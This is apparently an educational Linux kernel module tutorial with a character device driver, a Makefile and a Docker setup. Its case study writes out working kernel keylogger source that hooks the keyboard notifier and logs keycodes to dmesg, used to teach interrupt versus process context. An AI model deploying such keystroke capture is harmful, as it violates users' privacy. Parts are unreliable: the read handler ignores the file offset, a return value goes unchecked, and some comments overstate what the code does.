# 08: Kernel Module Development (Writing a Device Driver)

In Module 07, we learned that the Kernel mediates access between User Space applications and raw hardware. But how does this mediation physically occur?

In Linux, hardware devices are represented as special files in the `/dev` directory (e.g., `/dev/sda` for a hard drive). 
In this module, we will literally write a **Character Device Driver**. This Module will dynamically create a fake hardware file called `/dev/mastery_device`. User Space applications can read and write strings to this "hardware" natively using standard `echo` and `cat` commands!

---

## 1. The C Device Driver Source Code

Writing a real driver means implementing **File Operations**. The Kernel needs to know exactly what C function to execute when a User Space program tries to `open()`, `read()`, or `write()` to your device.

**`mastery_device.c`**
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>      // Required for character device registration
#include <linux/uaccess.h> // Required for copy_to_user and copy_from_user
#include <linux/mutex.h>   // Required for safe concurrent access

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mastery Guide Builder");
MODULE_DESCRIPTION("A highly robust Character Device Driver with Mutex Locking.");

#define DEVICE_NAME "mastery_device"
#define BUFFER_SIZE 256

// Global State
static int major_number;                   // The unique ID the Kernel assigns our driver
static char message[BUFFER_SIZE] = {0};    // The physical memory buffer storing the data
static short message_len = 0;              // Current length of the message
static int is_open = 0;                    // Is the device currently in use?
static DEFINE_MUTEX(device_mutex);         // A Kernel Mutex to prevent data races

// 1. The READ Operation (Triggered when User Space runs `cat /dev/mastery_device`)
static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {
    int errors = 0;
    
    // We cannot just `return message`. The `buffer` pointer belongs to User Space (Ring 3)!
    // If we access it directly, the Kernel will instantly panic and crash the machine.
    // We MUST securely copy the kernel memory into the user's memory space.
    errors = copy_to_user(buffer, message, message_len);

    if (errors == 0) {
        printk(KERN_INFO "MasteryDevice: Sent %d characters to User Space.\\n", message_len);
        return message_len; // Tell the user program how many bytes it successfully captured
    } else {
        printk(KERN_INFO "MasteryDevice: Failed to securely send data to User.\\n");
        return -EFAULT;
    }
}

// 2. The WRITE Operation (Triggered when User Space runs `echo "Hello" > /dev/mastery_device`)
static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset) {
    if (len > BUFFER_SIZE - 1) {
        len = BUFFER_SIZE - 1; // Prevent Buffer Overflow attacks!
    }

    // Securely pull the untrusted data out of User Space into the Kernel buffer
    copy_from_user(message, buffer, len);
    message[len] = '\\0'; // Null-terminate the string safely
    message_len = len;

    printk(KERN_INFO "MasteryDevice: Received %zu characters from User Space.\\n", len);
    return len;
}

// 3. The OPEN Operation (Triggered when a program first touches the file)
static int dev_open(struct inode *inodep, struct file *filep) {
    // Process Context Execution:
    // User Space applications triggering `open()` run in "Process Context".
    // This means we are allowed to use `mutex_lock()` which might safely put the process to sleep.
    if (!mutex_trylock(&device_mutex)) {
        printk(KERN_ALERT "MasteryDevice: Device is currently locked by another process!\\n");
        return -EBUSY;
    }

    is_open++;
    printk(KERN_INFO "MasteryDevice: Device successfully opened.\\n");
    return 0;
}

// 4. The RELEASE/CLOSE Operation
static int dev_release(struct inode *inodep, struct file *filep) {
    mutex_unlock(&device_mutex); // We release the lock!
    is_open--;
    printk(KERN_INFO "MasteryDevice: Device successfully closed.\\n");
    return 0;
}

// Map the Kernel File Operations to our custom C functions!
static struct file_operations fops = {
    .open = dev_open,
    .read = dev_read,
    .write = dev_write,
    .release = dev_release,
};

// 5. Driver Initialization (Triggered on `insmod`)
static int __init mastery_init(void) {
    printk(KERN_INFO "MasteryDevice: Initializing the Character Driver.\\n");
    
    mutex_init(&device_mutex); // Initialize the hardware lock dynamically

    // Dynamically request a Major device identifier from the Kernel
    major_number = register_chrdev(0, DEVICE_NAME, &fops);
    if (major_number < 0) {
        printk(KERN_ALERT "MasteryDevice: Failed to dynamically acquire a major number.\\n");
        return major_number;
    }

    printk(KERN_INFO "MasteryDevice: Successfully registered with Major ID %d.\\n", major_number);
    printk(KERN_INFO "MasteryDevice: To interact, run: sudo mknod /dev/%s c %d 0\\n", DEVICE_NAME, major_number);
    return 0;
}

// 6. Driver Teardown (Triggered on `rmmod`)
static void __exit mastery_exit(void) {
    unregister_chrdev(major_number, DEVICE_NAME);
    mutex_destroy(&device_mutex);
    printk(KERN_INFO "MasteryDevice: Driver gracefully unregistered and unloaded.\\n");
}

module_init(mastery_init);
module_exit(mastery_exit);
```

---

## 2. Advanced Context Constraints (The Danger Zone)

Our driver currently uses a `mutex_lock()` perfectly safely inside the `dev_open` function. Why is this safe?
Because file operations (`open`, `read`, `write`) execute in exactly what the Kernel calls **Process Context**. A user space program explicitly invoked a Syscall. If another program is holding the lock, the Kernel intelligently puts the waiting process to sleep safely.

### The "Interrupt" Context Deadlock
If you were writing a driver for a physical Network Interface Card (NIC), the physical hardware would fire an electrical **Interrupt Request (IRQ)** whenever a packet arrived.
Interrupt Handlers execute in **Atomic Context**. They are not running on behalf of a user process; they brutally interrupt the CPU immediately.

> [!CAUTION]
> **You CANNOT sleep in Atomic Context!**
> If you call a function that can sleep (like `mutex_lock` or standard memory allocation via `kmalloc` without the `GFP_ATOMIC` flag) inside an Interrupt Handler, you will instantly trigger an unrecoverable **System Deadlock**. The Kernel will freeze indefinitely because the CPU scheduler is physically deactivated during an atomic interrupt!
> 
> *Solution:* To handle heavy blocking operations triggered by an interrupt, experts use **Workqueues**. You acknowledge the atomic interrupt instantly, and defer the heavy blocking I/O work cleanly to a secondary background Kernel Thread running safely in Process Context!

---

## 3. Case Study: Building a Kernel Keylogger

To practically demonstrate the extreme danger of Atomic Context vs Process Context, let's design the architecture for a hardware-level Kernel Keylogger. 

If you want to log every single keystroke natively, you must register a **Keyboard Notifier Block**. This hooks directly into the core Linux input subsystem.

### The Naive (Catastrophic) Approach
Amateur developers attempt to open a file (`/var/log/keys.log`) and write to it directly inside the keyboard interrupt callback.

**Why this instantly destroys the server:**
The keyboard callback `keys_pressed()` triggers the exact microsecond your finger compresses the physical plastic key. The CPU instantly drops everything it is doing to handle the **Hardware Interrupt** in **Atomic Context**.
If your callback attempts to write to a log file, the Ext4 filesystem driver might need to spin up the hard drive, requesting the CPU put the thread to sleep (`mutex_lock`) while waiting for the physical disk platter to spin. 
**You CANNOT sleep in Atomic Context.** The Kernel schedulers are disabled! The CPU sits there waiting for the disk forever. The mouse freezes. The screen freezes. You must pull the power plug out of the wall.

### The Expert Approach (Workqueues)
To successfully keylog without crashing the machine, we split the architecture in half:

1. **Top Half (Atomic):** The `register_keyboard_notifier` callback fires when a key is pressed. It does zero I/O. It simply grabs the keycode integer, pushes it into a lightweight memory queue, and calls `schedule_work()`. It then exits instantly in 0.001 microseconds.
2. **Bottom Half (Process Context):** The Linux **Workqueue** system runs a background Kernel Thread safely in *Process Context*. It wakes up, sees there is a keycode in the memory queue, safely opens the physical log file, writes the data (safely sleeping if the hard drive is busy), and goes back to sleep.

**`keylogger.c` Architecture:**
```c
#include <linux/module.h>
#include <linux/keyboard.h>    // Required for the Notifier block
#include <linux/workqueue.h>   // Required to defer work safely to Process Context
#include <linux/slab.h>        // Required for kmalloc

// 1. Define our Workqueue structure
struct keylog_work {
    struct work_struct work;
    int keycode;
};

// 2. The Bottom Half (Process Context - Safe to block/sleep/write files)
static void write_to_disk_worker(struct work_struct *work) {
    struct keylog_work *my_work = container_of(work, struct keylog_work, work);
    
    // SAFE: We are actively running in a background Kernel Thread right now.
    // We can confidently open files, write to Ext4 natively, and safely sleep if needed!
    printk(KERN_INFO "Keylogger Background Thread: Safely logged Keycode %d to disk.\\n", my_work->keycode);
    
    // Free the dynamically allocated memory
    kfree(my_work);
}

// 3. The Top Half (Atomic Context - Hardware Interrupt Callback)
int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYSYM && param->down) {
        // DANGER: We are exclusively inside an Atomic Context Hardware Callback! 
        // Do NOT open files here! Do NOT use Mutexes!
        
        // Dynamically allocate memory for our background task (using GFP_ATOMIC which never sleeps)
        struct keylog_work *work = kmalloc(sizeof(struct keylog_work), GFP_ATOMIC);
        if (work) {
            work->keycode = param->value;
            // Map the work struct onto our dedicated Process Context worker function
            INIT_WORK(&work->work, write_to_disk_worker);
            
            // Instantly hand the physical workload off to the Kernel background thread and exit!
            schedule_work(&work->work); 
        }
    }
    return NOTIFY_OK; // Instantly return control to the Operating System
}

static struct notifier_block keys_nb = {
    .notifier_call = keys_pressed
};

static int __init keylogger_init(void) {
    // Hook the raw keyboard bus!
    register_keyboard_notifier(&keys_nb);
    printk(KERN_INFO "Keylogger initialized safely using Workqueues.\\n");
    return 0;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keys_nb);
    flush_scheduled_work(); // Crucial: Ensure all background I/O writes finish before unloading!
    printk(KERN_INFO "Keylogger unregistered.\\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
MODULE_LICENSE("GPL");
```

---

## 4. Compiling and Deploying the Drivers

To compile *both* the Character Device driver and the Keylogger driver simultaneously, we modify the specialized Kernel `Makefile`. The code must be compiled perfectly against the exact Linux Headers matching your currently running kernel version (`uname -r`).

**`Makefile`**
```makefile
# We instruct the Kernel build system to create TWO modules by appending to obj-m
obj-m += mastery_device.o keylogger.o

all:
	# Run Make inside the official Kernel build directory, but compile the code in our current dir!
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
*(Warning: Make sure `make -C` lines are indented securely with an actual `TAB` character, not spaces!)*

### Execution Steps
1. **Ensure Headers are Installed:** `sudo apt install build-essential linux-headers-$(uname -r)`
2. **Compile Both Modules:** 
   ```bash
   make
   ```
   You will see the kernel build system output `.ko` (Kernel Object) files for both drivers!

### Deploying the Character Device (`mastery_device.ko`)
1. **Inject into Ring 0:** `sudo insmod mastery_device.ko`
2. **Discover the Given ID:** `sudo dmesg | tail -n 2`
   *(If `dmesg` says "Successfully registered with Major ID 240", record this integer.)*
3. **Create the Hardware Device File Manually:** 
   ```bash
   sudo mknod /dev/mastery_device c 240 0
   sudo chmod 666 /dev/mastery_device
   ```
4. **Interact with the Fake Hardware:**
   ```bash
   echo "Writing raw data into a C buffer inside Ring 0!" > /dev/mastery_device
   cat /dev/mastery_device
   ```

### Deploying the Keylogger (`keylogger.ko`)
1. **Inject into Ring 0:** `sudo insmod keylogger.ko`
2. **Verify the Hook Active:** `sudo dmesg | grep Keylogger`
3. **Trigger the Interrupt:** Simply type *anything* on your physical keyboard.
4. **Read the Background I/O Logs:** 
   Watch `dmesg` live. You will see the background Workqueue thread safely outputting the integer keycodes without deadlocking your machine!
   ```bash
   sudo dmesg -w
   ```

### 5. Graceful Teardown
When finished, you must always unregister dynamically loaded modules to free Kernel memory gracefully:
```bash
sudo rm /dev/mastery_device
sudo rmmod mastery_device
sudo rmmod keylogger
```

### Summary
You just successfully engineered two physical Kernel drivers. By orchestrating File Operation mappings (`fops`) for character devices, and isolating aggressive Hardware Interrupt callbacks using `schedule_work()`, you have officially written native C code for the Linux monolithic architecture.

---

## 5. Containerized Execution (MacBook / Linux)
Dockerizing Kernel Module compilation is incredibly complex because containers **share the Host Kernel**. You must dynamically pass the Host's kernel headers into the container, and the container must be `privileged: true` to insert (`insmod`) directly into the physical host machine's Ring 0.

*(Note for Mac users: Docker Desktop runs a tiny invisible Linux Virtual Machine natively. When you compile and insert this module from Docker on Mac, you are actually happily modifying the Docker Desktop Linux Kernel, which is completely safe!)*

**`Dockerfile`**
```dockerfile
FROM ubuntu:latest
RUN apt-get update && apt-get install -y build-essential kmod
WORKDIR /module
CMD ["/bin/bash"]
```

**`docker-compose.yml`**
```yaml
services:
  kernel-sandbox:
    build: .
    privileged: true # CRITICAL: Required to write to /dev and execute insmod
    volumes:
      # We mount the Host's physical Kernel Headers identically into the container!
      - /lib/modules:/lib/modules:ro
      - .:/module
    stdin_open: true
    tty: true
```

**To Run:**
```bash
docker compose run kernel-sandbox

# Inside the container, you can now run 'make' securely!
make
insmod mastery_device.ko
```

---
[<< Previous: The Linux Kernel](./07_The_Linux_Kernel.md) | [Home: Curriculum Map](./README.md) | [Next: Memory & Storage Internals >>](./09_Memory_and_Storage_Internals.md)
